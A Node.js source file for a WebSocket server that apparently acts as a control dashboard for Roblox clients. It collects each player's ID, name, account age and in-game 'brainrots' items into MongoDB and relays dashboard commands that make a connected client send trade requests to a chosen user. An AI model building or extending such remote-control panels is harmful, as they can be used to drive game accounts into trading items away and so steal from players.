const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url'); // Ajouté pour parser l'URL

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION MONGODB ---
const MONGO_URI = process.env.MONGO_URI;
mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ [DB] MongoDB Connecté"))
  .catch(err => console.error("❌ [DB] Erreur Connexion :", err));

const ClientModel = mongoose.model('Client', new mongoose.Schema({
    userId: { type: Number, unique: true },
    name: String,
    displayName: String,
    accountAge: Number,
    brainrots: mongoose.Schema.Types.Mixed, 
    updatedAt: { type: Date, default: Date.now }
}, { strict: false }));

// --- GESTION DES CLIENTS ACTIFS ---
// Ce dictionnaire stocke les sockets actifs avec le nom d'utilisateur comme clé
const activeClients = new Map();

async function broadcastToDashboard() {
    try {
        const allClients = await ClientModel.find({});
        // On prépare une liste des noms actuellement connectés pour le dashboard
        const onlineNames = Array.from(activeClients.keys());
        
        const payload = JSON.stringify({ 
            type: 'REFRESH', 
            data: allClients,
            online: onlineNames 
        });
        
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(payload);
            }
        });
    } catch (e) {
        console.error("❌ [BROADCAST] Erreur :", e);
    }
}

// --- GESTION WEBSOCKET ---
wss.on('connection', async (ws, req) => {
    // 1. Récupérer le username depuis l'URL (ex: ?username=Player1)
    const parameters = url.parse(req.url, true).query;
    const username = parameters.username;

    if (username) {
        activeClients.set(username, ws);
        console.log(`🔌 Client Roblox connecté : ${username} (Total: ${activeClients.size})`);
    } else {
        console.log("🖥️ Dashboard ou client inconnu connecté");
    }

    await broadcastToDashboard();

    ws.on('message', async (message) => {
        try {
            const payload = JSON.parse(message);

            if (payload.Method === "PlayerInfos") {
                const d = payload.Data;
                await ClientModel.findOneAndUpdate(
                    { userId: d.UserId },
                    {
                        name: d.Name,
                        displayName: d.DisplayName,
                        accountAge: d.AccountAge,
                        brainrots: d.Brainrots,
                        updatedAt: new Date()
                    },
                    { upsert: true }
                );
                console.log(`[DB] Mise à jour : ${d.Name}`);
                await broadcastToDashboard();
            }

            // EXEMPLE : Si tu reçois une commande du dashboard pour faire un Trade
            // { "Method": "Command_Send", "Target": "Destinataire", "From": "BotName" }
            if (payload.Method === "Command_Send") {
                const targetBot = activeClients.get(payload.From);
                if (targetBot && targetBot.readyState === WebSocket.OPEN) {
                    targetBot.send(JSON.stringify({
                        Type: "TradeRequest",
                        TargetUser: payload.Target
                    }));
                }
            }

        } catch (e) {
            console.error("⚠️ Erreur message :", e.message);
        }
    });

    ws.on('close', () => {
        if (username) {
            activeClients.delete(username);
            console.log(`❌ ${username} déconnecté`);
        }
        broadcastToDashboard();
    });
});

app.use(express.static('public'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVEUR M4GIX PRÊT SUR LE PORT ${PORT}`);
});
